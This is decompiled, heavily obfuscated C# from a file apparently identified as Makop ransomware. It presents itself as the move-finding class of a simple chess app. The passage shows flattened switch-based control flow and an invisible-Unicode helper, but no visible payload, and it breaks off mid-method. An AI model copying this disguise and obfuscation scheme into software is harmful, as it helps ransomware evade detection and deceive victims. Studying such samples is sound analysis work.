// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.MoveFinder
// Assembly: هx, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 374CAC08-464B-4E84-B463-5CFD524FF26C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-74995e87513e47357c351f37565a1422202dace38dc789308d72417b5797b93e.exe

using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class MoveFinder
  {
    public Dictionary<int, List<PossibleMoves>> MoveList = new Dictionary<int, List<PossibleMoves>>();
    private Board board;
    public PieceColor KingColorOnCheck;
    public bool IsOnCheck;

    public MoveFinder(Board b) => this.board = b;

    public void FindAllMoves()
    {
label_1:
      int num1 = -1267462699;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1771711672)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Clear();
            num1 = (int) num2 * -320398699 ^ -2060249020;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      using (Dictionary<int, ChessPiece>.ValueCollection.Enumerator enumerator = this.board.WhitePieces.Values.GetEnumerator())
      {
label_11:
        int num3 = enumerator.MoveNext() ? -1552466784 : (num3 = -1197207944);
        ChessPiece current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ -1771711672)) % 6U)
          {
            case 0:
              num3 = -1552466784;
              continue;
            case 1:
              this.FindMoveFrom(current.Current);
              num3 = (int) num4 * -839834523 ^ 426515824;
              continue;
            case 2:
              current = enumerator.Current;
              num3 = -1375887593;
              continue;
            case 3:
              num3 = (int) num4 * -327863487 ^ 1821225524;
              continue;
            case 5:
              goto label_11;
            default:
              goto label_13;
          }
        }
      }
label_13:
      Dictionary<int, ChessPiece>.ValueCollection.Enumerator enumerator1 = this.board.BlackPieces.Values.GetEnumerator();
      try
      {
label_18:
        int num5 = !enumerator1.MoveNext() ? -2066152156 : (num5 = -811135837);
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) (num5 ^ -1771711672)) % 5U)
          {
            case 0:
              num5 = -811135837;
              continue;
            case 1:
              this.FindMoveFrom(enumerator1.Current.Current);
              num5 = -1404464484;
              continue;
            case 2:
              goto label_18;
            case 4:
              num5 = (int) num6 * 938171774 ^ 62314647;
              continue;
            default:
              goto label_26;
          }
        }
      }
      finally
      {
        enumerator1.Dispose();
label_21:
        int num7 = -1301646397;
        while (true)
        {
          uint num8;
          switch ((num8 = (uint) (num7 ^ -1771711672)) % 3U)
          {
            case 0:
              goto label_21;
            case 2:
              num7 = (int) num8 * -927798893 ^ -43483917;
              continue;
            default:
              goto label_25;
          }
        }
label_25:;
      }
label_26:
      bool showAllMoves = this.board.ShowAllMoves;
label_27:
      int num9 = -212400495;
      while (true)
      {
        uint num10;
        switch ((num10 = (uint) (num9 ^ -1771711672)) % 5U)
        {
          case 0:
            goto label_27;
          case 1:
            int num11 = showAllMoves ? -297868479 : (num11 = -1325247233);
            num9 = num11 ^ (int) num10 * -1569776188;
            continue;
          case 2:
            num9 = (int) num10 * -108870088 ^ 1704594851;
            continue;
          case 3:
            this.HighLightMoveStyle();
            num9 = (int) num10 * 1513948313 ^ 335457044;
            continue;
          case 4:
            goto label_29;
          default:
            goto label_23;
        }
      }
label_29:
      return;
label_23:;
    }

    public void FindMoveFrom(Square x)
    {
label_1:
      int num1 = 1538356052;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1071232201)) % 14U)
        {
          case 0:
label_12:
            this.handleBishop(x);
            num1 = 1084396255;
            continue;
          case 1:
            switch (x.Piece.Kind)
            {
              case Pieces.Pawn:
                goto label_10;
              case Pieces.Knight:
                goto label_11;
              case Pieces.Bishop:
                goto label_12;
              case Pieces.Rook:
                goto label_6;
              case Pieces.King:
                goto label_15;
              case Pieces.Queen:
                goto label_13;
              default:
                num1 = (int) num2 * -1249353723 ^ 1143162858;
                continue;
            }
          case 2:
            num1 = (int) num2 * -1227429335 ^ 1254063252;
            continue;
          case 3:
label_13:
            this.handleQueen(x);
            num1 = 1866038767;
            continue;
          case 4:
            num1 = (int) num2 * 36818017 ^ -833008392;
            continue;
          case 5:
            num1 = (int) num2 * 524130209 ^ -1080657701;
            continue;
          case 6:
            goto label_1;
          case 7:
            goto label_3;
          case 8:
            num1 = (int) num2 * -1393011679 ^ -895125903;
            continue;
          case 9:
label_10:
            this.handlePawn(x);
            num1 = 694465290;
            continue;
          case 10:
label_6:
            this.handleRook(x);
            num1 = 1466086136;
            continue;
          case 11:
label_15:
            this.handleKing(x);
            num1 = 694465290;
            continue;
          case 12:
            num1 = (int) num2 * 18086742 ^ -1914083378;
            continue;
          case 13:
label_11:
            this.handleKnight(x);
            num1 = 694465290;
            continue;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:;
    }

    public void HighLightMoveStyle()
    {
    }

    public void Clear()
    {
    }

    private void handlePawn(Square x)
    {
      int num1 = 0;
label_1:
      int num2 = 1725528619;
      while (true)
      {
        uint num3;
        int num4;
        bool flag1;
        int num5;
        bool flag2;
        int num6;
        bool flag3;
        bool flag4;
        bool flag5;
        int b;
        Square square;
        bool flag6;
        bool flag7;
        int num7;
        bool flag8;
        int num8;
        bool flag9;
        bool flag10;
        bool flag11;
        bool flag12;
        int num9;
        int num10;
        int num11;
        int num12;
        int num13;
        int num14;
        int num15;
        int num16;
        int num17;
        int num18;
        switch ((num3 = (uint) (num2 ^ 1441551305)) % 65U)
        {
          case 0:
            num2 = 1380243712;
            continue;
          case 1:
            this.addMove(num1, num5, x);
            num2 = (int) num3 * 1539775991 ^ -1223224324;
            continue;
          case 2:
            flag8 = this.board.lastPassantPawn == this.board[num7, x.Rank].Piece;
            num2 = (int) num3 * -1340194547 ^ 335640849;
            continue;
          case 3:
            num5 = x.Rank + num8;
            if (num5 >= 0)
            {
              num2 = (int) num3 * 1216877382 ^ 462875156;
              continue;
            }
            num9 = 0;
            goto label_81;
          case 4:
            if (x.Rank != 4)
            {
              num10 = 0;
              break;
            }
            num2 = 1378049745;
            continue;
          case 5:
            if (num5 >= 0)
            {
              num2 = (int) num3 * -1996812364 ^ -2050164391;
              continue;
            }
            goto label_83;
          case 6:
            num13 = num5 < 8 ? 1 : 0;
            goto label_71;
          case 7:
            num14 = 6;
            goto label_47;
          case 8:
            square = this.board[num1, num5];
            num2 = (int) num3 * -400303717 ^ 1941971189;
            continue;
          case 9:
            num2 = (int) num3 * -1280140488 ^ 424875015;
            continue;
          case 10:
            num2 = 1280541560;
            continue;
          case 11:
            flag1 = num4 < 8;
            num2 = 1880161473;
            continue;
          case 12:
            if (!flag4)
            {
              num2 = (int) num3 * 943632414 ^ -996421047;
              continue;
            }
            num15 = 5;
            goto label_52;
          case 13:
            this.addMove(num1, num5, x);
            num2 = (int) num3 * 1438753936 ^ 1411370812;
            continue;
          case 14:
            flag2 = this.board.lastPassantPawn == this.board[num4, x.Rank].Piece;
            num2 = (int) num3 * 847366448 ^ -1175128661;
            continue;
          case 15:
            flag5 = this.board[num7, x.Rank].Piece != null;
            num2 = (int) num3 * -111249194 ^ 104155370;
            continue;
          case 16:
            num1 = x.File;
            num2 = (int) num3 * 2078501326 ^ -696291995;
            continue;
          case 17:
            int num19 = !flag8 ? -1120045991 : (num19 = -494331568);
            num2 = num19 ^ (int) num3 * -1558857032;
            continue;
          case 18:
            this.addMove(num1, num5, x);
            num2 = (int) num3 * 763396434 ^ 201567857;
            continue;
          case 19:
            int num20 = flag10 ? 2082806312 : (num20 = 1549413160);
            num2 = num20 ^ (int) num3 * 1777312484;
            continue;
          case 20:
            int num21 = flag11 ? -1194037505 : (num21 = -2098146725);
            num2 = num21 ^ (int) num3 * 57645948;
            continue;
          case 21:
            num1 = x.File + 1;
            num2 = 554321273;
            continue;
          case 22:
            num12 = num5 < 8 ? 1 : 0;
            goto label_84;
          case 23:
            num16 = -1;
            goto label_62;
          case 24:
            goto label_1;
          case 25:
            int num22 = flag7 ? 2123061366 : (num22 = 767480776);
            num2 = num22 ^ (int) num3 * -772313069;
            continue;
          case 26:
            num2 = 1739540696;
            continue;
          case 27:
            square = this.board[num1, num5];
            int num23 = square.IsEmpty ? 1559827487 : (num23 = 329517676);
            num2 = num23 ^ (int) num3 * -1539009232;
            continue;
          case 28:
            num11 = x.Piece.Color == PieceColor.Black ? 1 : 0;
            goto label_23;
          case 29:
            int num24 = flag9 ? 1600315251 : (num24 = 2018891693);
            num2 = num24 ^ (int) num3 * 638823724;
            continue;
          case 30:
            goto label_3;
          case 31:
            num2 = (int) num3 * -144278473 ^ -520089394;
            continue;
          case 32:
            num7 = x.File - 1;
            num4 = x.File + 1;
            flag9 = num7 >= 0;
            num2 = (int) num3 * 1062553497 ^ 488334996;
            continue;
          case 33:
            if (this.board[num4, x.Rank].Piece.Kind == Pieces.Pawn)
            {
              num2 = (int) num3 * 1996803855 ^ -1405169602;
              continue;
            }
            num17 = 0;
            goto label_40;
          case 34:
            num1 = x.File - 1;
            num5 = x.Rank + num8;
            if (num1 >= 0)
            {
              num2 = 2026255962;
              continue;
            }
            goto label_83;
          case 35:
            if (this.board[num7, x.Rank].Piece.Kind == Pieces.Pawn)
            {
              num2 = (int) num3 * 2036402175 ^ -348142953;
              continue;
            }
            num18 = 0;
            goto label_95;
          case 36:
            num17 = this.board[num4, x.Rank].Piece.Color != x.Piece.Color ? 1 : 0;
            goto label_40;
          case 37:
            num15 = 2;
            goto label_52;
          case 38:
            num2 = 1792210579;
            continue;
          case 39:
            if (num5 >= 0)
            {
              num2 = (int) num3 * -1734290343 ^ 534637175;
              continue;
            }
            goto label_70;
          case 40:
            int num25 = !flag12 ? -1997296963 : (num25 = -1808738412);
            num2 = num25 ^ (int) num3 * -1133893692;
            continue;
          case 41:
            num10 = x.Piece.Color == PieceColor.White ? 1 : 0;
            break;
          case 42:
            if (x.Piece.Color != PieceColor.White)
            {
              num2 = (int) num3 * 1377421211 ^ -823522001;
              continue;
            }
            num16 = 1;
            goto label_62;
          case 43:
            num2 = (int) num3 * -1401244628 ^ -1889414007;
            continue;
          case 44:
            this.addCapture(num4, b, x, this.board[num4, x.Rank].Piece);
            num2 = (int) num3 * -41621048 ^ -1181580446;
            continue;
          case 45:
            if (x.Piece.Color == PieceColor.White)
            {
              num14 = 1;
              goto label_47;
            }
            else
            {
              num2 = (int) num3 * -309257637 ^ 249003328;
              continue;
            }
          case 46:
            num2 = (int) num3 * 51204781 ^ -668784525;
            continue;
          case 47:
            num2 = (int) num3 * -1569000382 ^ -1266058489;
            continue;
          case 48:
            this.addCapture(num7, b, x, this.board[num7, x.Rank].Piece);
            num2 = (int) num3 * -1712241019 ^ -2119983451;
            continue;
          case 49:
            num5 = x.Rank + num8;
            if (num1 < 8)
            {
              num2 = (int) num3 * -529072309 ^ -993446154;
              continue;
            }
            goto label_70;
          case 50:
            int num26 = this.board[num4, x.Rank].Piece != null ? 1491430645 : (num26 = 54583914);
            num2 = num26 ^ (int) num3 * 40757561;
            continue;
          case 51:
            num5 = 0;
            num2 = (int) num3 * -1090239973 ^ 1888320417;
            continue;
          case 52:
            int num27 = !flag2 ? -301945639 : (num27 = -2049942160);
            num2 = num27 ^ (int) num3 * -878506269;
            continue;
          case 53:
            flag10 = flag4 | flag6;
            num2 = (int) num3 * -1497534653 ^ 702145416;
            continue;
          case 54:
            num5 = x.Rank + 2 * num8;
            num2 = (int) num3 * 1421031009 ^ 122164805;
            continue;
          case 55:
            num2 = (int) num3 * -1345809158 ^ 475599261;
            continue;
          case 56:
            flag3 = x.Rank == num6;
            num2 = 1517794682;
            continue;
          case 57:
            this.addMove(num1, num5, x);
            num2 = (int) num3 * -1755454549 ^ 187907538;
            continue;
          case 58:
            num9 = num5 < 8 ? 1 : 0;
            goto label_81;
          case 59:
            num18 = this.board[num7, x.Rank].Piece.Color != x.Piece.Color ? 1 : 0;
            goto label_95;
          case 60:
            int num28 = flag5 ? 1024504416 : (num28 = 1797957631);
            num2 = num28 ^ (int) num3 * 378872402;
            continue;
          case 61:
            square = this.board[num1, num5];
            int num29 = !square.IsEmpty ? -612352028 : (num29 = -287577129);
            num2 = num29 ^ (int) num3 * -689787159;
            continue;
          case 62:
            int num30 = !flag1 ? -699768993 : (num30 = -1575449644);
            num2 = num30 ^ (int) num3 * 1176505230;
            continue;
          case 63:
            int num31 = !square.IsEmpty ? 659196538 : (num31 = 1276733419);
            num2 = num31 ^ (int) num3 * -1395408459;
            continue;
          case 64:
            int num32 = flag3 ? 1064037725 : (num32 = 742515471);
            num2 = num32 ^ (int) num3 * -1732721730;
            continue;
          default:
            goto label_99;
        }
        flag4 = num10 != 0;
        if (x.Rank == 3)
        {
          num2 = 601569506;
          continue;
        }
        num11 = 0;
label_23:
        flag6 = num11 != 0;
        num2 = 931330509;
        continue;
label_40:
        int num33;
        num2 = num33 = num17 != 0 ? 301743860 : (num33 = 686043439);
        continue;
label_47:
        num6 = num14;
        num2 = 1629070585;
        continue;
label_52:
        b = num15;
        num2 = 1143722838;
        continue;
label_62:
        num8 = num16;
        num2 = 1886004914;
        continue;
label_70:
        num13 = 0;
label_71:
        flag11 = num13 != 0;
        num2 = 276063431;
        continue;
label_81:
        flag7 = num9 != 0;
        num2 = 827924689;
        continue;
label_83:
        num12 = 0;
label_84:
        int num34;
        num2 = num34 = num12 != 0 ? 945897270 : (num34 = 1280541560);
        continue;
label_95:
        flag12 = num18 != 0;
        num2 = 579411430;
      }
label_3:
      return;
label_99:;
    }

    private void handleQueen(Square x)
    {
label_1:
      int num1 = 1947351140;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1562320953)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.handleRook(x);
            num1 = (int) num2 * 412520081 ^ -1417828112;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 2009109577 ^ 1740150868;
            continue;
          case 4:
            this.handleBishop(x);
            num1 = (int) num2 * 898825650 ^ -8106461;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void handleKing(Square x)
    {
      this.addMove(x.File + 1, x.Rank + 1, x);
      this.addMove(x.File + 1, x.Rank - 1, x);
label_1:
      int num1 = -1832381046;
      bool canCastleKingSide1;
      bool canCastleQueenSide1;
      bool canCastleQueenSide2;
      bool canCastleKingSide2;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2017150298)) % 27U)
        {
          case 0:
            flag1 = x.Piece.Color == PieceColor.White;
            num1 = (int) num2 * -1476184896 ^ 167157777;
            continue;
          case 1:
            num1 = (int) num2 * 874950472 ^ 339678010;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.addMove(x.File + 1, x.Rank, x);
            this.addMove(x.File - 1, x.Rank, x);
            this.addMove(x.File, x.Rank + 1, x);
            this.addMove(x.File, x.Rank - 1, x);
            num1 = (int) num2 * 1919318011 ^ -1810401220;
            continue;
          case 4:
            num1 = (int) num2 * 1111455929 ^ -637847300;
            continue;
          case 5:
            int num3 = !canCastleQueenSide2 ? 291374834 : (num3 = 1836290720);
            num1 = num3 ^ (int) num2 * 2136009488;
            continue;
          case 6:
            num1 = -1300440095;
            continue;
          case 7:
            this.addMove(x.File - 1, x.Rank - 1, x);
            num1 = (int) num2 * 1413869404 ^ -571205501;
            continue;
          case 8:
            num1 = (int) num2 * 1819398656 ^ 157378640;
            continue;
          case 9:
            num1 = -637405703;
            continue;
          case 10:
            int num4 = !canCastleQueenSide1 ? 1973616196 : (num4 = 460824593);
            num1 = num4 ^ (int) num2 * 513947590;
            continue;
          case 11:
            canCastleQueenSide2 = this.board.WhiteCanCastleQueenSide;
            num1 = -1114321014;
            continue;
          case 12:
            goto label_1;
          case 13:
            int num5 = canCastleKingSide2 ? 778687986 : (num5 = 753260754);
            num1 = num5 ^ (int) num2 * 1860080679;
            continue;
          case 14:
            canCastleKingSide1 = this.board.WhiteCanCastleKingSide;
            num1 = (int) num2 * 1082446883 ^ -1816039294;
            continue;
          case 15:
            canCastleQueenSide1 = this.board.BlackCanCastleQueenSide;
            num1 = -1368944065;
            continue;
          case 16:
            int num6 = !flag1 ? 1168173032 : (num6 = 306484906);
            num1 = num6 ^ (int) num2 * 1736447871;
            continue;
          case 17:
            this.handleBigCastling(x);
            num1 = (int) num2 * 1927759268 ^ -2063400384;
            continue;
          case 18:
            flag2 = x.Piece.Color == PieceColor.Black;
            num1 = -1548791333;
            continue;
          case 19:
            this.handleSmallCastling(x);
            num1 = (int) num2 * 1524994670 ^ -300059826;
            continue;
          case 20:
            canCastleKingSide2 = this.board.BlackCanCastleKingSide;
            num1 = (int) num2 * 1382723325 ^ 250315375;
            continue;
          case 21:
            this.addMove(x.File - 1, x.Rank + 1, x);
            num1 = (int) num2 * 458163433 ^ -2101245465;
            continue;
          case 22:
            this.handleSmallCastling(x);
            num1 = (int) num2 * -619767771 ^ 1241512424;
            continue;
          case 23:
            int num7 = flag2 ? 1474638088 : (num7 = 1289998012);
            num1 = num7 ^ (int) num2 * 467159401;
            continue;
          case 24:
            this.handleBigCastling(x);
            num1 = (int) num2 * 1605476296 ^ -683794982;
            continue;
          case 25:
            num1 = (int) num2 * -91537178 ^ -184062025;
            continue;
          case 26:
            int num8 = !canCastleKingSide1 ? -293079254 : (num8 = -450538124);
            num1 = num8 ^ (int) num2 * -1274611545;
            continue;
          default:
            goto label_29;
        }
      }
label_3:
      return;
label_29:;
    }

    private void handleBigCastling(Square x)
    {
label_1:
      int num1 = 1686023782;
      while (true)
      {
        uint num2;
        Square square1;
        Square square2;
        Square square3;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ 374335839)) % 9U)
        {
          case 0:
            if (square1.IsEmpty)
            {
              num1 = (int) num2 * 1598206363 ^ -639160300;
              continue;
            }
            break;
          case 1:
            int num4 = flag ? 775683793 : (num4 = 1315842213);
            num1 = num4 ^ (int) num2 * 1244693943;
            continue;
          case 2:
            square3 = this.board[x.File - 3, x.Rank];
            num1 = (int) num2 * -109941275 ^ 761707351;
            continue;
          case 3:
            if (square2.IsEmpty)
            {
              num1 = (int) num2 * -1216946775 ^ -779520179;
              continue;
            }
            break;
          case 4:
            num3 = square3.IsEmpty ? 1 : 0;
            goto label_7;
          case 5:
            goto label_1;
          case 6:
            square1 = this.board[x.File - 1, x.Rank];
            square2 = this.board[x.File - 2, x.Rank];
            num1 = (int) num2 * -1802135158 ^ 1984745036;
            continue;
          case 7:
            goto label_3;
          case 8:
            this.addMove(x.File - 2, x.Rank, x);
            num1 = (int) num2 * 1141814985 ^ 899975523;
            continue;
          default:
            goto label_15;
        }
        num3 = 0;
label_7:
        flag = num3 != 0;
        num1 = 1658775638;
      }
label_3:
      return;
label_15:;
    }

    private void handleSmallCastling(Square x)
    {
label_1:
      int num1 = -486700287;
      while (true)
      {
        uint num2;
        Square square1;
        Square square2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ -25766152)) % 7U)
        {
          case 0:
            this.addMove(x.File + 2, x.Rank, x);
            num1 = (int) num2 * -146187097 ^ -1329532773;
            continue;
          case 1:
            goto label_3;
          case 2:
            num3 = square1.IsEmpty ? 1 : 0;
            break;
          case 3:
            square2 = this.board[x.File + 1, x.Rank];
            num1 = (int) num2 * -1172171841 ^ -1474046450;
            continue;
          case 4:
            square1 = this.board[x.File + 2, x.Rank];
            if (square2.IsEmpty)
            {
              num1 = (int) num2 * 2013165041 ^ 2086186942;
              continue;
            }
            num3 = 0;
            break;
          case 5:
            goto label_1;
          case 6:
            int num4 = flag ? 748091960 : (num4 = 1150294263);
            num1 = num4 ^ (int) num2 * 34471550;
            continue;
          default:
            goto label_12;
        }
        flag = num3 != 0;
        num1 = -791825473;
      }
label_3:
      return;
label_12:;
    }

    private void handleRook(Square x)
    {
label_1:
      int num1 = 529550538;
      int num2;
      int num3;
      int b1;
      int num4;
      int num5;
      bool flag1;
      int b2;
      int a1;
      bool flag2;
      bool flag3;
      bool flag4;
      bool flag5;
      bool flag6;
      bool flag7;
      int a2;
      while (true)
      {
        uint num6;
        switch ((num6 = (uint) (num1 ^ 934950285)) % 39U)
        {
          case 0:
            ++num5;
            num1 = (int) num6 * -1809290663 ^ -435089281;
            continue;
          case 1:
            int num7 = !flag1 ? -902735200 : (num7 = -1961368721);
            num1 = num7 ^ (int) num6 * -1838645950;
            continue;
          case 2:
            int num8;
            num1 = num8 = num2 >= 8 ? 131119701 : (num8 = 742222046);
            continue;
          case 3:
            int num9 = flag5 ? 1559082711 : (num9 = 455092448);
            num1 = num9 ^ (int) num6 * -460646903;
            continue;
          case 4:
            int num10 = !flag7 ? -993107759 : (num10 = -1867707292);
            num1 = num10 ^ (int) num6 * -283263841;
            continue;
          case 5:
            int num11 = !flag4 ? 2074922225 : (num11 = 1696115044);
            num1 = num11 ^ (int) num6 * -1883895584;
            continue;
          case 6:
            b2 = x.Rank - num4;
            num1 = 1837290611;
            continue;
          case 7:
            a2 = x.File - num2;
            num1 = (int) num6 * 1596211948 ^ -448814280;
            continue;
          case 8:
            num1 = 1254443452;
            continue;
          case 9:
            num1 = (int) num6 * 345793239 ^ 1959892030;
            continue;
          case 10:
            flag4 = this.addMove(a2, x.Rank, x);
            num1 = (int) num6 * -1894588825 ^ -468074053;
            continue;
          case 11:
            goto label_1;
          case 12:
            flag2 = this.addMove(a1, x.Rank, x);
            num1 = (int) num6 * -198528545 ^ -1035824585;
            continue;
          case 13:
            num3 = 1;
            num1 = (int) num6 * -1260309026 ^ 531684538;
            continue;
          case 14:
            num1 = (int) num6 * 1438069134 ^ -51982646;
            continue;
          case 15:
            flag1 = num5 < 8;
            num1 = 1967880956;
            continue;
          case 16:
            ++num2;
            num1 = (int) num6 * 1345453413 ^ -1709107596;
            continue;
          case 17:
            int num12 = !flag6 ? -1312328322 : (num12 = -1496928874);
            num1 = num12 ^ (int) num6 * 455225701;
            continue;
          case 18:
            num1 = 2109488436;
            continue;
          case 19:
            num2 = 1;
            num1 = 866848725;
            continue;
          case 20:
            a1 = x.File + num5;
            num1 = (int) num6 * 1944668438 ^ 1470252718;
            continue;
          case 21:
            b1 = x.Rank + num3;
            num1 = 626370882;
            continue;
          case 22:
            num1 = (int) num6 * 850659010 ^ 2011543536;
            continue;
          case 23:
            num1 = 826892288;
            continue;
          case 24:
            ++num3;
            num1 = (int) num6 * 47004410 ^ 719613058;
            continue;
          case 25:
            ++num4;
            num1 = 1396788088;
            continue;
          case 26:
            num1 = 237811391;
            continue;
          case 27:
            flag6 = num3 < 8;
            num1 = 1108222961;
            continue;
          case 28:
            flag5 = this.addMove(x.File, b2, x);
            num1 = (int) num6 * 1606559611 ^ -1106768750;
            continue;
          case 29:
            num1 = 1260788506;
            continue;
          case 30:
            num1 = (int) num6 * 1167068652 ^ 462654745;
            continue;
          case 31:
            num4 = 1;
            num1 = 1205185959;
            continue;
          case 32:
            flag7 = this.addMove(x.File, b1, x);
            num1 = (int) num6 * 762269666 ^ 1374012993;
            continue;
          case 33:
            num1 = (int) num6 * -1049857874 ^ -606852336;
            continue;
          case 34:
            int num13 = flag3 ? -1791824049 : (num13 = -219059538);
            num1 = num13 ^ (int) num6 * 1794852100;
            continue;
          case 35:
            flag3 = num4 < 8;
            num1 = 1067908121;
            continue;
          case 36:
            goto label_3;
          case 37:
            int num14 = flag2 ? -120723093 : (num14 = -1054240225);
            num1 = num14 ^ (int) num6 * 325317114;
            continue;
          case 38:
            num5 = 1;
            num1 = 2000660480;
            continue;
          default:
            goto label_41;
        }
      }
label_3:
      return;
label_41:;
    }

    private void handleBishop(Square x)
    {
label_1:
      int num1 = 488160733;
      int num2;
      bool flag1;
      int num3;
      int num4;
      int b1;
      int num5;
      int a1;
      bool flag2;
      int a2;
      bool flag3;
      bool flag4;
      bool flag5;
      bool flag6;
      int b2;
      bool flag7;
      while (true)
      {
        uint num6;
        switch ((num6 = (uint) (num1 ^ 1894119583)) % 40U)
        {
          case 0:
            a1 = x.File - num5;
            num1 = 2039748559;
            continue;
          case 1:
            ++num5;
            num1 = 792123798;
            continue;
          case 2:
            num3 = 1;
            num1 = (int) num6 * -1333780007 ^ -197799071;
            continue;
          case 3:
            num1 = (int) num6 * -1473341026 ^ 1648135001;
            continue;
          case 4:
            num4 = 1;
            num1 = 917399153;
            continue;
          case 5:
            num1 = (int) num6 * -378596826 ^ 2121291428;
            continue;
          case 6:
            num1 = (int) num6 * -1693574261 ^ -322990585;
            continue;
          case 7:
            ++num3;
            num1 = (int) num6 * -958934266 ^ -883498915;
            continue;
          case 8:
            ++num4;
            num1 = 57273149;
            continue;
          case 9:
            flag6 = this.addMove(a2, b1, x);
            num1 = (int) num6 * -209330758 ^ -1489167090;
            continue;
          case 10:
            goto label_1;
          case 11:
            flag7 = this.addMove(a1, b2, x);
            num1 = (int) num6 * 850027417 ^ -709943500;
            continue;
          case 12:
            flag3 = this.addMove(x.File - num2, x.Rank - num2, x);
            num1 = (int) num6 * 1433488481 ^ -151143219;
            continue;
          case 13:
            int num7 = this.addMove(x.File + num3, x.Rank + num3, x) ? -465387215 : (num7 = -1104894633);
            num1 = num7 ^ (int) num6 * -1875572759;
            continue;
          case 14:
            b1 = x.Rank - num4;
            num1 = (int) num6 * 487121465 ^ -515974408;
            continue;
          case 15:
            flag1 = num2 < 8;
            num1 = 558640808;
            continue;
          case 16:
            b2 = x.Rank + num5;
            num1 = (int) num6 * 1292066558 ^ 1044685660;
            continue;
          case 17:
            num2 = 1;
            num1 = 1742884488;
            continue;
          case 18:
            num1 = (int) num6 * -417087987 ^ 981077851;
            continue;
          case 19:
            int num8 = !flag6 ? -195291890 : (num8 = -1271439902);
            num1 = num8 ^ (int) num6 * 440129707;
            continue;
          case 20:
            num1 = (int) num6 * 315670651 ^ 664191859;
            continue;
          case 21:
            num1 = 1507068856;
            continue;
          case 22:
            goto label_3;
          case 23:
            num1 = (int) num6 * 833733227 ^ -997849381;
            continue;
          case 24:
            flag5 = num3 < 8;
            num1 = 280779876;
            continue;
          case 25:
            num1 = 1219333250;
            continue;
          case 26:
            flag4 = num4 < 8;
            num1 = 968784533;
            continue;
          case 27:
            num1 = 946784282;
            continue;
          case 28:
            int num9 = flag2 ? 919730547 : (num9 = 1738864693);
            num1 = num9 ^ (int) num6 * -250035309;
            continue;
          case 29:
            num5 = 1;
            num1 = 886766520;
            continue;
          case 30:
            num1 = 1521163763;
            continue;
          case 31:
            a2 = x.File + num4;
            num1 = 1779520025;
            continue;
          case 32:
            int num10 = flag7 ? -1879672843 : (num10 = -1252671882);
            num1 = num10 ^ (int) num6 * 498424929;
            continue;
          case 33:
            flag2 = num5 < 8;
            num1 = 1846935579;
            continue;
          case 34:
            int num11 = !flag4 ? 812515734 : (num11 = 1815532920);
            num1 = num11 ^ (int) num6 * -596855680;
            continue;
          case 35:
            int num12 = flag5 ? 193481462 : (num12 = 597054587);
            num1 = num12 ^ (int) num6 * 1143603640;
            continue;
          case 36:
            num1 = (int) num6 * 1170654075 ^ 440553946;
            continue;
          case 37:
            ++num2;
            num1 = (int) num6 * -1538269446 ^ -555091606;
            continue;
          case 38:
            int num13 = flag3 ? -1258262812 : (num13 = -240726638);
            num1 = num13 ^ (int) num6 * -1764641591;
            continue;
          case 39:
            int num14 = !flag1 ? 719252115 : (num14 = 943921368);
            num1 = num14 ^ (int) num6 * 784094751;
            continue;
          default:
            goto label_42;
        }
      }
label_3:
      return;
label_42:;
    }

    private void handleKnight(Square x)
    {
label_1:
      int num1 = 541684424;
      while (true)
      {
        uint num2;
        Square sq;
        int Rank;
        int index;
        bool flag1;
        int[] numArray1;
        int File;
        ChessPiece piece;
        bool flag2;
        int[] numArray2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 114262844)) % 25U)
        {
          case 0:
            int num4 = !sq.IsEmpty ? 1450005643 : (num4 = 2040678584);
            num1 = num4 ^ (int) num2 * 1069979284;
            continue;
          case 1:
            index = 0;
            num1 = (int) num2 * -487267134 ^ -688808105;
            continue;
          case 2:
            ++index;
            num1 = 1072926123;
            continue;
          case 3:
            num1 = (int) num2 * -1973076173 ^ -329941972;
            continue;
          case 4:
            File = x.File + numArray1[index];
            num1 = 377841409;
            continue;
          case 5:
            num3 = Rank > 7 ? 1 : 0;
            goto label_7;
          case 6:
            flag2 = sq.Piece.Color != x.Piece.Color;
            num1 = 1273347224;
            continue;
          case 7:
            flag1 = index < 8;
            num1 = 1730402800;
            continue;
          case 8:
            num1 = 1269066113;
            continue;
          case 9:
            this.MoveList[piece.Id].Add(new PossibleMoves(piece, sq, UserAction.Capture));
            num1 = (int) num2 * -962768900 ^ -231190920;
            continue;
          case 10:
            if (File >= 0)
            {
              num1 = (int) num2 * 1093992316 ^ 1807464799;
              continue;
            }
            break;
          case 11:
            int num5 = !flag2 ? 1398011177 : (num5 = 1856312110);
            num1 = num5 ^ (int) num2 * 598214688;
            continue;
          case 12:
            int[] numArray3 = new int[8];
            // ISSUE: field reference
            MoveFinder.\u202B‍⁭‭⁪‎‬‪‌‫‬‭‎⁬​‫‬​‫⁯‫​‍‪‮‎‭⁬‏⁪‭‫‭‭‬‌⁭‭‮‭‮((Array) numArray3, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0035CED5D200AE41F70ABC6A1ADBFEA2A6329B454E3DDE2E39C795A55B0DB4DAD80));
            numArray2 = numArray3;
            num1 = (int) num2 * -1787080010 ^ 1413552662;
            continue;
          case 13:
            int[] numArray4 = new int[8];
            // ISSUE: field reference
